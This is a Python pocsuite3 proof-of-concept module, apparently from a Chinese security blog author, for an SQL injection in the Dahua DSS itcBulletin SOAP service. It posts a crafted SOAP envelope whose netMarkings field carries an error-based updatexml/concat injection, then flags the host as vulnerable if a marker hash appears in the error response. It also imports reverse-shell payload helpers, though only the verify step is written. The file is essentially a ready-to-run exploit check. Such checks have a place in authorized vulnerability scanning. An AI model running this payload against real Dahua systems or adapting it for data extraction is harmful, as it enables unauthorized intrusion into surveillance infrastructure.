# _*_ coding:utf-8 _*_
# @Time : 2023/12/25 12:34
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str
import re

class dahuaDSS(POCBase):
    pocDesc = '''大华DSS itcBulletin SQL注入漏洞'''
    vulID = '20231224'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-12-23'
    createDate = '2023-12-24'
    updateDate = '2023-12-24'
    name = '大华DSS itcBulletin SQL注入漏洞'
    appName = '大华DSS'

    def _verify(self):

        result = {}
        url = self.url + '/portal/services/itcBulletin?wsdl'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            "Content-Type": "application/x-www-form-urlencoded"
        }

        payload = """<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>  <s11:Body>    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>      <netMarkings>        (updatexml(1,concat(0x7e,md5("This website has a vulnerability"),0x7e),1))) and (1=1    </netMarkings>    </ns1:deleteBulletin>  </s11:Body></s11:Envelope>"""
        match = ""
        try:

            response = requests.post(url, headers=headers,data=payload,verify=False)
            if response.status_code == 500 and '~c1f5f60a14b0bc9546b6f93d1ca5486' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(dahuaDSS)